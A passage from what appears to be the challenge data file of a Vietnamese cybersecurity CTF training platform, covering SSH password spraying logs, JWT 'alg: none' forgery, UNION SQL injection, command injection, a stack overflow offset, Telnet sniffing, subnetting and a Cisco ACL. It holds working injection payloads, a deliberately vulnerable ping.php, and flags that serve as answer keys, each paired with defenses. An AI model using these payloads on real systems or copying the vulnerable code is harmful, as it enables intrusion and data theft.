                flag: "FLAG{txid_0x9c4e_ip_194.26.29.88}"
            },

            // --- DOMAIN 6: REMOTE ACCESS DOMAIN ---
            {
                id: 11,
                domain: "remote-access",
                domainVi: "6. Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                title: "Thử Thách 11: Nhật Ký Tấn Công Mật Khẩu SSH Bằng THChydra",
                category: "Tấn Công Mật Khẩu (Password Spraying / Brute-force)",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Credential Access", technique: "T1110.003", name: "Brute Force: Password Spraying" },
                description: "Máy chủ SSH nội bộ mở cổng 22 ra ngoài Internet để nhân viên làm việc từ xa (Work From Home). Kẻ tấn công sử dụng công cụ Hydra thực hiện cuộc tấn công rải mật khẩu (Password Spraying) với mật khẩu phổ biến 'Welcome@2026' nhằm tránh kích hoạt cơ chế khóa tài khoản. Hãy phân tích file nhật ký xác thực /var/log/auth.log để tìm tài khoản nhân viên duy nhất bị bẻ khóa và địa chỉ IP của kẻ tấn công!",
                theory: "Password Spraying là một biến thể tinh vi của tấn công Brute-force. Thay vì thử hàng ngàn mật khẩu trên 1 tài khoản (dễ bị cơ chế Account Lockout khóa tài khoản sau 3-5 lần sai), kẻ tấn công thử đúng 1 mật khẩu phổ biến (như MuaHe2026!) trên danh sách hàng trăm tài khoản khác nhau. Điều này giúp cuộc tấn công diễn ra âm thầm dưới ngưỡng cảnh báo của hệ thống SIEM.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "auth-log-filter",
                    logfile: "/var/log/auth.log",
                    totalEntries: 7
                },
                codeSnippet: `Nov 20 02:45:01 srv-ssh sshd[4102]: Failed password for invalid user admin from 198.51.100.142 port 48102 ssh2
Nov 20 02:45:03 srv-ssh sshd[4105]: Failed password for user it_helpdesk from 198.51.100.142 port 48104 ssh2
Nov 20 02:45:06 srv-ssh sshd[4108]: Failed password for user accountant from 198.51.100.142 port 48106 ssh2
Nov 20 02:45:09 srv-ssh sshd[4111]: Failed password for user sysadmin from 198.51.100.142 port 48108 ssh2
Nov 20 02:45:12 srv-ssh sshd[4115]: Accepted password for user remote_devops from 198.51.100.142 port 48110 ssh2
Nov 20 02:45:13 srv-ssh sshd[4115]: pam_unix(sshd:session): session opened for user remote_devops by (uid=0)
Nov 20 02:45:16 srv-ssh sshd[4120]: Failed password for user tester from 198.51.100.142 port 48112 ssh2

---
YÊU CẦU:
Kiểm toán nhật ký xác thực trên để xác định:
1. Tên tài khoản người dùng duy nhất bị đăng nhập thành công
2. Địa chỉ IP của kẻ tấn công đang thực hiện Password Spraying
Cú pháp cờ: FLAG{user_<tên_user>_ip_<IP_Attacker>}
(Ví dụ: FLAG{user_john_ip_10.20.30.40})`,
                virtualFiles: {
                    "auth.log": `Nov 20 02:45:01 Failed password for invalid user admin from 198.51.100.142\nNov 20 02:45:12 Accepted password for user remote_devops from 198.51.100.142 port 48110 ssh2`,
                    "sshd_config": `Port 22\nPermitRootLogin no\nPasswordAuthentication yes`
                },
                defense: `1. Bắt buộc xác thực bằng SSH Keypair (khóa công khai/khóa riêng) và tắt hoàn toàn xác thực bằng mật khẩu dạng text:
PasswordAuthentication no
2. Cài đặt và cấu hình Fail2ban giám sát /var/log/auth.log tự động tạo quy tắc iptables DROP các IP có trên 3 lần đăng nhập thất bại.
3. Không mở cổng SSH/RDP trực tiếp ra Internet mà phải đi qua cổng VPN có xác thực 2 lớp (MFA).`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Lệnh <code>grep "Accepted" auth.log</code> trong Terminal.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Tìm dòng duy nhất bắt đầu bằng <code>Accepted password for user ... from ...</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{user_remote_devops_ip_198.51.100.142}"
            },
            {
                id: 12,
                domain: "remote-access",
                domainVi: "6. Vùng Truy Nhập Từ Xa (Remote Access Domain)",
                title: "Thử Thách 12: Chiếm Đoạt Phiên JWT Lỗ Hổng Thuật Toán 'alg': 'none'",
                category: "Chiếm Đoạt Phiên (Session Hijacking / JWT)",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Defense Evasion", technique: "T1553", name: "Subvert Trust Controls" },
                description: "Cổng truy nhập từ xa SSL-VPN sử dụng JSON Web Token (JWT) trong Cookie để duy trì phiên làm việc của nhân viên. Bạn đăng nhập với tài khoản khách (role: guest). Máy chủ phía backend sử dụng thư viện JWT chưa vá lỗi kiểm tra chữ ký khi thuật toán đặt là 'none'. Hãy tạo token giả mạo với quyền quản trị viên tối cao role: admin!",
                theory: "JSON Web Token (RFC 7519) gồm 3 phần: Header, Payload và Signature được mã hóa Base64URL. Chuẩn JWT hỗ trợ thuật toán 'none' cho các trường hợp không cần chữ ký số (Unsecured JWT). Tuy nhiên, nếu thư viện phía máy chủ không kiểm tra bắt buộc thuật toán ký (như HS256/RS256) mà chỉ tin tưởng trường 'alg' trong Header của client gửi lên, kẻ tấn công có thể sửa Header thành 'alg': 'none', tự thay đổi quyền hạn trong Payload thành 'admin', xóa phần Signature đi và gửi lên để chiếm quyền quản trị.",
                sandboxType: "web",
                sandboxData: {
                    type: "jwt-repeater",
                    originalToken: "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoia2hhY2hoYW5nIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQ4NDAwMDB9.i_DcxLgU-3N9S_01Yp69GZJmQOq8Q0rK9uO1r-8Lh3M"
                },
                codeSnippet: `=== RAW JWT TOKEN NHẬN ĐƯỢC TỪ COOKIE ===
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoia2hhY2hoYW5nIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQ4NDAwMDB9.i_DcxLgU-3N9S_01Yp69GZJmQOq8Q0rK9uO1r-8Lh3M

---
YÊU CẦU:
Máy chủ VPN bị lỗ hổng chấp nhận thuật toán "none" (CVE-2015-9235).
1. Giải mã token trên để kiểm tra cấu trúc Header và Payload.
2. Giả mạo Header mới với thuật toán "none" (chữ thường): {"alg":"none","typ":"JWT"}
3. Giả mạo Payload mới nâng quyền hạn: {"user":"administrator","role":"admin","iat":1794840000}
4. Mã hóa Base64URL Header và Payload mới, ghép lại theo chuẩn JWT (Header.Payload.) với phần chữ ký để trống (kết thúc bằng dấu chấm .).

Cú pháp cờ: Nộp toàn bộ chuỗi JWT giả mạo kết thúc bằng dấu chấm:
FLAG{<jwt_token_bỏ_chữ_ký>}
(Gợi ý: Header {"alg":"none","typ":"JWT"} mã hóa Base64URL là: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0)`,
                virtualFiles: {
                    "original_jwt.txt": `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoia2hhY2hoYW5nIiwicm9sZSI6InVzZXIiLCJpYXQiOjE3OTQ4NDAwMDB9.i_DcxLgU-3N9S_01Yp69GZJmQOq8Q0rK9uO1r-8Lh3M`,
                    "jwt_exploit_guide.txt": `Replace alg with "none", encode payload, append trailing dot.`
                },
                defense: `1. Không bao giờ cho phép thuật toán 'none' trong quá trình xác thực JWT:
jwt.verify(token, secretKey, { algorithms: ['HS256', 'RS256'] });
2. Sử dụng Secret Key có độ dài và độ phức tạp cao (ít nhất 256 bits ngẫu nhiên) để chống tấn công vét cạn khóa ký HMAC.
3. Lưu trữ JWT trong Cookie có cờ 'HttpOnly' và 'Secure' để chống bị đánh cắp qua lỗ hổng XSS.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <code>jwt.io</code>, CyberChef (To Base64URL), hoặc lệnh <code>b64 encode &lt;json&gt;</code> trong Terminal.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Mã hóa Base64URL Payload mới: <code>{"user":"administrator","role":"admin","iat":1794840000}</code>.<br>
            - Ghép với Header đã cho, kết thúc bằng dấu chấm <code>.</code> ở cuối cùng.
        </div>
    </div>
</div>`,
                flag: "FLAG{eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW5pc3RyYXRvciIsInJvbGUiOiJhZG1pbiIsImlhdCI6MTc5NDg0MDAwMH0.}"
            },

            // --- DOMAIN 7: SYSTEM & APPLICATION DOMAIN ---
            {
                id: 13,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 13: Khai Thác SQL Injection UNION-Based Trích Xuất Dữ Liệu",
                category: "Tấn Công Ứng Dụng Web (SQL Injection / Data Exfiltration)",
                difficulty: "Nâng cao",
                points: 200,
                mitre: { tactic: "Initial Access", technique: "T1190", name: "Exploit Public-Facing Application: SQLi" },
                description: "Ứng dụng web Cổng thông tin doanh nghiệp nội bộ có tham số tìm kiếm nhân sự profile.php?id=1 dính lỗi SQL Injection do nối chuỗi thô. Kẻ tấn công sử dụng kỹ thuật UNION-Based để nối bảng admin_users và trích xuất chuỗi mã băm mật khẩu MD5 của tài khoản root_admin. Hãy crack hash để tìm mật khẩu cờ dạng rõ!",
                theory: "SQL Injection xuất hiện khi dữ liệu người dùng nhập vào được ghép trực tiếp vào câu lệnh truy vấn SQL mà không qua xác thực hoặc tham số hóa. Kỹ thuật UNION SELECT cho phép kẻ tấn công đính kèm kết quả của một bảng khác (như admin_users) vào dữ liệu trả về của câu lệnh SELECT ban đầu. Bằng cách làm cho mệnh đề đầu tiên trả về rỗng (như id=-1), kết quả từ bảng admin_users sẽ được hiển thị ra màn hình web.",
                sandboxType: "web",
                sandboxData: {
                    type: "sql-repeater",
                    endpoint: "/profile.php?id=",
                    testPayloads: [
                        { name: "Truy vấn hợp lệ", payload: "1", result: "User: John Miller | Dept: IT" },
                        { name: "Khai thác UNION SELECT", payload: "-1' UNION SELECT 1, group_concat(username, 0x3a, pass_hash), 3 FROM admin_users-- -", result: "Extracted: root_admin:482c811da5d5b4bc6d497ffa98491e38" }
                    ]
                },
                codeSnippet: `-- Pentester khai thác lỗ hổng UNION SELECT trên cổng thông tin nội bộ:
GET /profile.php?id=-1' UNION SELECT 1, group_concat(username, 0x3a, pass_hash), 3 FROM admin_users-- - HTTP/1.1
Host: secure-portal.internal

-- Dữ liệu hiển thị trích xuất trên giao diện web:
[DB_DUMP_OUTPUT]:
root_admin:482c811da5d5b4bc6d497ffa98491e38

---
YÊU CẦU:
1. Xác định mật khẩu gốc dạng rõ (plaintext) sau khi giải mã chuỗi băm MD5 32 ký tự hex:
   482c811da5d5b4bc6d497ffa98491e38
Cú pháp cờ: FLAG{<mật_khẩu_admin_sau_khi_crack>}
(Ví dụ mẫu: FLAG{admin123})`,
                virtualFiles: {
                    "hashes.txt": `root_admin:482c811da5d5b4bc6d497ffa98491e38`,
                    "database_schema.sql": `CREATE TABLE admin_users (id INT, username VARCHAR(50), pass_hash VARCHAR(32));`
                },
                defense: `1. Sử dụng Parameterized Queries (Prepared Statements) trong toàn bộ mã nguồn:
$stmt = $pdo->prepare('SELECT name, dept FROM users WHERE id = :id');
$stmt->execute(['id' => $_GET['id']]);
2. Nâng cấp thuật toán băm mật khẩu từ MD5 sang Argon2id hoặc bcrypt (với cost factor >= 12) kèm Salt ngẫu nhiên.
3. Phân quyền tài khoản cơ sở dữ liệu của ứng dụng theo nguyên tắc đặc quyền tối thiểu (Least Privilege).`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Dùng lệnh <code>crack md5 &lt;hash&gt;</code> trong Terminal bên cạnh!<br>
            • CrackStation.net, Hashcat, John the Ripper.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Chuỗi 32 hex là băm MD5.<br>
            - Bạn có thể tra cứu hash này trên cơ sở dữ liệu rainbow table để tìm mật khẩu ban đầu.
        </div>
    </div>
</div>`,
                flag: "FLAG{password123}"
            },
            {
                id: 14,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 14: Thực Thi Mã Từ Xa RCE Qua Lỗ Hổng Command Injection",
                category: "Tấn Công Ứng Dụng Web (Command Injection / RCE)",
                difficulty: "Nâng cao",
                points: 250,
                mitre: { tactic: "Execution", technique: "T1059", name: "Command and Scripting Interpreter" },
                description: "Trang quản trị Router nội bộ có tính năng 'Network Diagnostic Ping' cho phép kiểm tra độ trễ mạng nhưng lập trình viên sử dụng trực tiếp hàm shell mà không lọc ký tự đặc biệt. Kẻ tấn công sử dụng toán tử phân tách lệnh ';' để đọc file cờ bí mật /etc/flag.txt được mã hóa Base64. Hãy phân tích phản hồi HTTP để lấy cờ!",
                theory: "Command Injection là lỗ hổng nghiêm trọng cho phép kẻ tấn công thực thi các lệnh hệ điều hành tùy ý thông qua ứng dụng web. Lỗ hổng xảy ra khi ứng dụng chuyển trực tiếp dữ liệu do người dùng kiểm soát vào các hàm gọi shell của hệ điều hành (như system, exec, passthru trong PHP hoặc subprocess trong Python) mà không kiểm tra các ký tự điều khiển luồng lệnh của Unix/Linux shell (như ;, &&, ||, |, `).",
                sandboxType: "web",
                sandboxData: {
                    type: "command-repeater",
                    endpoint: "/tools/ping.php",
                    param: "ip"
                },
                codeSnippet: `POST /tools/ping.php HTTP/1.1
Host: edge-router.internal.net
Content-Type: application/x-www-form-urlencoded

ip=127.0.0.1%3B+cat+%2Fetc%2Fflag.txt+%7C+base64

--- HTTP/1.1 200 OK ---
Content-Type: text/plain

PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.040 ms

--- 127.0.0.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss

[COMMAND OUTPUT]:
UkNFX3NlbWljb2xvbl9jb21tYW5kX2luamVjdGlvbl9wYXNzd29yZF9leGZpbA==

---
YÊU CẦU:
Kẻ tấn công đã chèn lệnh '; cat /etc/flag.txt | base64' để đọc file cờ và mã hóa Base64 kết quả trả về.
Hãy giải mã chuỗi Base64 trên để lấy cờ bí mật.
Cú pháp cờ: FLAG{<kết_quả_sau_khi_decode_base64>}
(Ví dụ: nếu chuỗi decode ra abc thì nộp FLAG{abc})`,
                virtualFiles: {
                    "ping.php": `<?php system("ping -c 1 " . $_POST['ip']); ?>`,
                    "b64_output.txt": `UkNFX3NlbWljb2xvbl9jb21tYW5kX2luamVjdGlvbl9wYXNzd29yZF9leGZpbA==`
                },
                defense: `1. Tránh gọi trực tiếp các lệnh hệ điều hành từ web server; sử dụng các thư viện ngôn ngữ chuẩn (như thư viện mạng native sockets).
2. Nếu bắt buộc phải thực thi lệnh shell, sử dụng hàm lọc và escape đối số nghiêm ngặt:
$safe_ip = escapeshellarg($_POST['ip']);
3. Xác thực dữ liệu đầu vào theo định dạng IP hợp lệ bằng biểu thức chính quy (Regex Whitelisting):
if (!filter_var($ip, FILTER_VALIDATE_IP)) { die("Invalid IP"); }`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • Lệnh <code>b64 decode &lt;chuỗi&gt;</code> trong Terminal.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Chuỗi trong phần Command Output được mã hóa Base64.<br>
            - Giải mã chuỗi này để nhận được nội dung cờ nguyên bản.
        </div>
    </div>
</div>`,
                flag: "FLAG{RCE_semicolon_command_injection_password_exfil}"
            },
            {
                id: 15,
                domain: "system-app",
                domainVi: "7. Vùng Hệ Thống & Ứng Dụng (System & App Domain)",
                title: "Thử Thách 15: Tính Toán Offset Tràn Bộ Đệm Ngăn Xếp (Stack Buffer Overflow)",
                category: "Lỗi Bộ Nhớ & Khai Thác Nhị Phân (Buffer Overflow / Exploit)",
                difficulty: "Chuyên gia",
                points: 300,
                mitre: { tactic: "Execution", technique: "T1203", name: "Exploitation for Client Execution: Buffer Overflow" },
                description: "Một dịch vụ nhị phân C 32-bit x86 chạy trên Linux sử dụng hàm không an toàn strcpy(dest, src) với bộ đệm 64 bytes. Khi gửi chuỗi mẫu De Bruijn cyclic pattern 100 ký tự sinh bởi Metasploit, chương trình bị crash tại thanh ghi con trỏ lệnh EIP có giá trị 0x41326441 (ASCII: 'Ad2A'). Hãy tính toán offset chính xác và xác định địa chỉ hàm get_secret_flag() để hoàn tất payload khai thác!",
                theory: "Trên kiến trúc x86, khi một hàm được gọi, CPU cấp phát một Stack Frame chứa: biến cục bộ (Local Variables), con trỏ khung (Saved EBP), và địa chỉ trở về (Saved Return Address - EIP). Khi hàm dùng các hàm sao chép không kiểm tra kích thước (như strcpy, gets, sprintf), dữ liệu nhập vào quá mức sẽ tràn qua bộ đệm, đè lên Saved EBP và đè trực tiếp lên EIP. Khi hàm kết thúc bằng lệnh 'ret', CPU sẽ nhảy tới địa chỉ mà kẻ tấn công đã kiểm soát.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "gdb-disassembly",
                    registers: { eax: "0x0", ebp: "0x41316441 (Ad1A)", eip: "0x41326441 (Ad2A)", esp: "0xffffd080" },
                    targetFunc: "get_secret_flag at 0x080485d6"
                },
                codeSnippet: `$ gdb -q ./vuln_server
Reading symbols from ./vuln_server...
(gdb) run < cyclic_pattern_100.txt
Program received signal SIGSEGV, Segmentation fault.
0x41326441 in ?? ()

(gdb) info registers
eax            0x0                 0
ebp            0x41316441          0x41316441
esp            0xffffd080          0xffffd080
eip            0x41326441          0x41326441  <-- [CRASH AT EIP]

(gdb) print get_secret_flag
$1 = {void ()} 0x080485d6 <get_secret_flag>

---
YÊU CẦU:
1. Giá trị thanh ghi EIP lúc crash là 0x41326441 (ký tự ASCII: 'Ad2A').
   Sử dụng công cụ tính offset pattern (như msf-pattern_offset) để tìm số byte đệm (offset) chính xác làm tràn đến EIP.
2. Địa chỉ hàm mục tiêu 'get_secret_flag' để ghi đè vào EIP.
Cú pháp cờ: FLAG{offset_<số_byte>_ret_<địa_chỉ_hàm>}
(Ví dụ: FLAG{offset_64_ret_0x08048123})`,
                virtualFiles: {
                    "gdb_output.txt": `SIGSEGV at 0x41326441 (Ad2A)\nTarget: get_secret_flag @ 0x080485d6`,
                    "pattern_100.txt": `Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3`
                },
                defense: `1. Thay thế các hàm không an toàn (strcpy, gets, strcat) bằng các hàm an toàn kiểm soát kích thước đệm (strncpy, fgets, snprintf).
2. Biên dịch nhị phân với đầy đủ các cơ chế bảo vệ của GCC:
gcc -fstack-protector-all -Wl,-z,relro,-z,now -D_FORTIFY_SOURCE=2 -pie -fPIE
3. Bật cơ chế ASLR (Address Space Layout Randomization) trong hệ điều hành Linux:
sysctl -w kernel.randomize_va_space=2`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <code>msf-pattern_offset -q 0x41326441</code>, Pwntools, GDB-GEF.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Chuỗi "Ad2A" xuất hiện tại vị trí byte thứ 72 trong chuỗi pattern.<br>
            - Địa chỉ hàm mục tiêu là <code>0x080485d6</code>.
        </div>
    </div>
</div>`,
                flag: "FLAG{offset_72_ret_0x080485d6}"
            },

            // --- DOMAIN 8: CCNA CORE PROTOCOLS (16 - 23) ---
            {
                id: 16,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 16: Wireshark Packet Forensics (Điều Tra Bắt Gói Tin Telnet)",
                category: "Phân Tích Giao Thức",
                difficulty: "Dễ",
                points: 100,
                mitre: { tactic: "Credential Access", technique: "T1040", name: "Network Sniffing: Cleartext" },
                description: "Hệ thống IDS phát hiện một nhân viên truy cập máy chủ quản trị bằng giao thức không mã hóa qua mạng nội bộ. Hãy phân tích đoạn trích xuất gói tin Ethernet/IP/TCP bắt được bên dưới để tìm mật khẩu cờ bí mật!",
                theory: "Telnet (cổng TCP 23) ra đời năm 1969 khi mạng Internet còn là mạng nội bộ tin cậy ARPANET. Giao thức này hoàn toàn không hỗ trợ mã hóa hay bảo vệ tính toàn vẹn. Mọi thao tác gõ phím, username và password đều được truyền ở dạng ký tự ASCII rõ ràng qua từng byte gói tin TCP, khiến bất kỳ ai có quyền bắt gói tin trên đường truyền đều có thể thu thập mật khẩu quản trị.",
                sandboxType: "wireshark",
                sandboxData: {
                    packets: [
                        { no: 42, time: "12.451", src: "192.168.1.10", dst: "192.168.1.1", proto: "TELNET", info: "Data: PASS Telnet_Password_Unencrypted_Vuln\\r\\n" }
                    ]
                },
                codeSnippet: `--- FRAME 42: TCP Packet Dump on Port 23 (Telnet) ---
0000   00 50 56 c0 00 08 00 0c 29 3e 51 4a 08 00 45 00
0010   00 48 a1 b2 40 00 40 06 7c d4 c0 a8 01 0a c0 a8
0020   01 01 04 23 00 17 6f 12 8a 44 2e 84 9b 12 50 18
0030   10 00 e3 9d 00 00 50 41 53 53 20 54 65 6c 6e 65
0040   74 5f 50 61 73 73 77 6f 72 64 5f 55 6e 65 6e 63
0050   72 79 70 74 65 64 5f 56 75 6c 6e 0d 0a

---
YÊU CẦU:
1. Giao thức Telnet (cổng 23) truyền dữ liệu ở dạng văn bản thuần (Cleartext) trong phần payload của TCP.
2. Dữ liệu bắt đầu từ byte thứ 36 (offset 0036 hex: 50 41 53 53 20 ... tức 'PASS ').
3. Hãy giải mã các byte Hex từ sau chữ 'PASS ' cho đến trước ký tự xuống dòng 0d 0a sang ký tự ASCII để tìm mật khẩu.
Cú pháp cờ: FLAG{<mật_khẩu_telnet_sau_khi_dịch_hex>}
(Ví dụ: FLAG{MySecretPassword})`,
                virtualFiles: {
                    "telnet_stream.hex": `50 41 53 53 20 54 65 6c 6e 65 74 5f 50 61 73 73 77 6f 72 64 5f 55 6e 65 6e 63 72 79 70 74 65 64 5f 56 75 6c 6e 0d 0a`
                },
                defense: `1. Cấm hoàn toàn việc sử dụng Telnet (Port 23) và FTP (Port 21) trong toàn bộ mạng doanh nghiệp.
2. Nâng cấp lên giao thức SSHv2 (Secure Shell - Port 22) có mã hóa mạnh (AES-256-GCM, Ed25519).
3. Đặt quy tắc Firewall chặn mọi kết nối đến cổng TCP 23.`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • CyberChef (From Hex), Python: <code>bytes.fromhex("54 65 6c...").decode('ascii')</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - Byte 54 là chữ T, 65 là chữ e, 6c là chữ l... Dịch hết đến trước 0d 0a.
        </div>
    </div>
</div>`,
                flag: "FLAG{Telnet_Password_Unencrypted_Vuln}"
            },
            {
                id: 17,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 17: Subnetting Broadcast Gate (Bẻ Khóa Mạng Con Ngầm)",
                category: "Tính Toán Mạng Con",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Discovery", technique: "T1016", name: "System Network Configuration Discovery" },
                description: "Máy chủ bảo mật của bạn đang ở chế độ ngủ (Standby) tại địa chỉ IP: 172.28.140.219/21. Để đánh thức máy chủ bằng gói tin Wake-on-LAN qua Router, bạn phải tính toán chính xác địa chỉ Directed Broadcast IP của mạng con này!",
                theory: "Mỗi mạng con IPv4 bao gồm 3 thành phần cốt lõi: Địa chỉ mạng (Network Address), Dải địa chỉ khả dụng cho host (Usable Host Range), và Địa chỉ quảng bá (Broadcast Address). Địa chỉ Directed Broadcast được sử dụng khi một thiết bị từ mạng ngoài muốn gửi gói tin đồng loạt tới tất cả các host nằm trong một subnet cụ thể phía sau Router.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "subnet-calc",
                    ip: "172.28.140.219",
                    prefix: 21
                },
                codeSnippet: `Target Host IP: 172.28.140.219
Prefix: /21

---
YÊU CẦU:
Tính toán địa chỉ Directed Broadcast IP chính xác của mạng con chứa host trên.
Cú pháp cờ: FLAG{<Broadcast_IP>}
(Ví dụ: FLAG{172.28.0.255})`,
                virtualFiles: {
                    "network_plan.txt": `Host: 172.28.140.219 | Mask: /21 (255.255.248.0)`
                },
                defense: `1. Vô hiệu hóa tính năng chuyển tiếp Directed Broadcast trên Router Cisco để chống tấn công Smurf DoS:
no ip directed-broadcast
2. Chia nhỏ mạng con (Micro-segmentation / VLSM) để thu hẹp phạm vi quảng bá (Broadcast Domain).`,
                hint: `<div class="space-y-2">
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-amber-300 bg-amber-950/70 px-2 py-0.5 rounded border border-amber-800 text-[11px]">
            🛠️ Công cụ gợi ý (Recommended Tools):
        </span>
        <div class="text-amber-100/90 pl-1 mt-1 text-xs">
            • <code>ipcalc 172.28.140.219/21</code>, Python <code>ipaddress</code>.
        </div>
    </div>
    <div>
        <span class="inline-flex items-center gap-1 font-bold text-cyan-300 bg-cyan-950/70 px-2 py-0.5 rounded border border-cyan-800 text-[11px]">
            💡 Ý tưởng & Hướng xử lý (Methodology & Ideas):
        </span>
        <div class="text-slate-200 pl-1 mt-1 text-xs leading-relaxed">
            - /21 có bước nhảy octet 3 là 8.<br>
            - 140 chia 8 = 17 dư 4 -> Mạng bắt đầu từ 136, Broadcast là 136 + 8 - 1 = 143.
        </div>
    </div>
</div>`,
                flag: "FLAG{172.28.143.255}"
            },
            {
                id: 18,
                domain: "networking",
                domainVi: "8. Giao Thức Mạng CCNA (Networking Protocols)",
                title: "Thử Thách 18: Cisco Firewall ACL Bypass (Xuyên Thủng Tường Lửa)",
                category: "Bảo Mật Tường Lửa",
                difficulty: "Trung bình",
                points: 150,
                mitre: { tactic: "Defense Evasion", technique: "T1562", name: "Impair Defenses" },
                description: "Tường lửa Cisco ASA được cấu hình bộ quy tắc Extended ACL sau đây để bảo vệ máy chủ Web tài chính 10.20.30.40. Cổng dịch vụ TCP bảo mật nào được phép truyền dữ liệu qua tường lửa mà không bị lệnh Implicit Deny chặn lại?",
                theory: "Cisco Extended Access Control Lists (ACL) phân tích gói tin dựa trên IP nguồn, IP đích, giao thức (TCP, UDP, ICMP) và số hiệu cổng dịch vụ. Mọi bộ ACL của Cisco đều kết thúc bằng một dòng lệnh ngầm định 'deny ip any any'. Để cho phép lưu lượng đi qua, quản trị viên phải viết các lệnh permit cụ thể đứng trước.",
                sandboxType: "forensics",
                sandboxData: {
                    type: "cisco-acl",
                    aclNumber: 105
                },
                codeSnippet: `Router# show access-lists 105
Extended IP access list 105
    10 permit tcp any host 10.20.30.40 eq 443
    20 permit udp any host 10.20.30.40 eq 53
    30 deny ip any any (implicit default)

---
YÊU CẦU:
Nhập số hiệu cổng TCP được phép đi qua tường lửa vào cấu trúc cờ:
Cú pháp cờ: FLAG{tcp_port_<số_cổng>_https}
